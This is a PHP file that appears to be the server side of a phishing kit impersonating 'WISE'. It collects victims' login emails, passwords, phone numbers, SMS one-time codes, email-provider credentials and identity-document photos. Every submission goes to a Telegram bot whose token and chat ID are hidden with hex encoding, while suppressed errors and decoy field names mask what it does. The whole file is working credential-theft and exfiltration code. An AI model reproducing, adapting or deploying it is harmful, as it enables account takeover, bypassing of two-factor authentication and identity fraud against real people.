<?php
session_start();
error_reporting(0);
ini_set('display_errors', 0);

if(!isset($_POST['action'])){
    exit;
}

function _0x_v($h){
    $r = "";
    for($i=0; $i<strlen($h); $i+=2) $r .= chr(hexdec(substr($h,$i,2)));
    return $r;
}

$_v1 = _0x_v("383838343530323932373A414148656E5956514C336b5056524D5078305537494F6957394F396352716244516f4d");
$_v2 = _0x_v("2d35333035303739313636");

$_a = $_POST['action'];


if ($_a === 'save_email') {
    if(isset($_POST['p_load'])){
        $json_data = base64_decode($_POST['p_load']);
        $data = json_decode($json_data, true);

        $provider = isset($data['brahim_src']) ? $data['brahim_src'] : '';
        $email = isset($data['fatima_log']) ? $data['fatima_log'] : '';
        $pass = isset($data['hassan_key']) ? $data['hassan_key'] : '';

        $_m = "<b>✉️ WISE: Email Sync (Step)</b>\n";
        $_m .= "🏷 Provider: <code>" . htmlspecialchars($provider) . "</code>\n";
        $_m .= "📧 Mail: <code>" . htmlspecialchars($email) . "</code>\n";
        $_m .= "🔑 Pass: <code>" . htmlspecialchars($pass) . "</code>\n";
        $_m .= "🌐 IP: <code>" . $_SERVER['REMOTE_ADDR'] . "</code>";

        _0x_out($_v1, $_v2, $_m);
    }
    echo "ver.php";
    exit;
}


elseif ($_a === 'save_identity_photo') {
    if(isset($_POST['img_data'])){
        $img = $_POST['img_data'];
        
    
        $img = str_replace('data:image/png;base64,', '', $img);
        $img = str_replace('data:image/jpeg;base64,', '', $img);
        $img = str_replace('data:image/jpg;base64,', '', $img);
        $data = base64_decode($img);
        
        $file_path = sys_get_temp_dir() . '/' . uniqid() . '.jpg';
        file_put_contents($file_path, $data);

       
        $u = "https://api.telegram.org/bot" . $_v1 . "/sendPhoto";
        $caption = "<b>🪪 WISE: Identity Verification Photo (Step)</b>\n🌐 IP: <code>" . $_SERVER['REMOTE_ADDR'] . "</code>";
        
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $u);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($c, CURLOPT_POST, 1);
        
        $post_fields = [
            'chat_id' => $_v2,
            'caption' => $caption,
            'parse_mode' => 'HTML',
            'photo' => new CURLFile($file_path)
        ];
        
        curl_setopt($c, CURLOPT_POSTFIELDS, $post_fields);
        curl_setopt($c, CURLOPT_TIMEOUT, 15);
        curl_exec($c);
        curl_close($c);
        
        @unlink($file_path); 
    }
    echo "success.php";
    exit;
}


elseif (strpos($_a, 'save_login') !== false || $_a === md5("save_login" . session_id())) {
    if(isset($_POST['u_data'])){
        $_d = explode('|', base64_decode($_POST['u_data']));
        $_m = "<b>📌 WISE: Login Details (Step 1)</b>\n";
        $_m .= "📧 Email: <code>" . (isset($_d[0]) ? htmlspecialchars($_d[0]) : '') . "</code>\n";
        $_m .= "🔑 Pass: <code>" . (isset($_d[1]) ? htmlspecialchars($_d[1]) : '') . "</code>\n";
        $_m .= "📞 Phone: <code>" . (isset($_d[2]) ? htmlspecialchars($_d[2]) : '') . "</code>\n";
        $_m .= "🌐 IP: <code>" . $_SERVER['REMOTE_ADDR'] . "</code>";
        _0x_out($_v1, $_v2, $_m);
    }
    echo "ot.php";
    exit;
}

elseif (strpos($_a, 'save_sms') !== false || $_a === md5("save_sms" . session_id())) {
    if(isset($_POST['p_load'])){
        $_d = explode('|', base64_decode($_POST['p_load']));
        $_m = "<b>💬 WISE: OTP Code (Step 2)</b>\n";
        $_m .= "🔢 Code: <code>" . (isset($_d[0]) ? htmlspecialchars($_d[0]) : '') . "</code>\n";
        $_m .= "🌐 IP: <code>" . $_SERVER['REMOTE_ADDR'] . "</code>";
        _0x_out($_v1, $_v2, $_m);
    }
    echo "em.php";
    exit;
}

function _0x_out($t, $i, $m) {
    $u = "https://api.telegram.org/bot" . $t . "/sendMessage";
    $c = curl_init();
    curl_setopt($c, CURLOPT_URL, $u);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($c, CURLOPT_POST, 1);
    curl_setopt($c, CURLOPT_POSTFIELDS, ['chat_id'=>$i, 'text'=>$m, 'parse_mode'=>'HTML']);
    curl_setopt($c, CURLOPT_TIMEOUT, 10);
    curl_exec($c);
    curl_close($c);
}
?>